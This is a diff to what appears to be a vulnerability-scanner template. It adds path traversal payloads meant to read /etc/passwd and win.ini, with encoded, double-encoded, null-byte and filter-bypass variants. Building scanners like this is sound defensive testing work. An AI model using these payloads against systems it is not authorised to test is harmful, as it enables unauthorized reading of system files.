@@ -16,14 +16,34 @@ http:
 
     payloads:
       payload:
+        # Basic traversal
         - "../../../etc/passwd"
         - "..\\..\\..\\windows\\win.ini"
         - "....//....//....//etc/passwd"
+        - "../../../../../../etc/passwd"
+        # URL encoded
         - "..%2F..%2F..%2Fetc%2Fpasswd"
         - "..%252f..%252f..%252fetc%252fpasswd"
+        - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        - "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"
+        # Double encoding
+        - "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+        - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+        # Absolute paths
         - "/etc/passwd"
-        - "../../../../../../etc/passwd"
+        - "C:\\windows\\win.ini"
         - "file:///etc/passwd"
+        - "file://C:/windows/win.ini"
+        # Null byte injection
+        - "../../../etc/passwd%00"
+        - "../../../etc/passwd\x00"
+        # Filter bypass
+        - "....//....//....//etc/passwd"
+        - "....//../...//../etc/passwd"
+        - "..\\../..\\../etc/passwd"
+        # With hashtag context
+        - "#../../../etc/passwd"
+        - "tag/../../../etc/passwd"
 
     stop-at-first-match: true
     matchers-condition: or
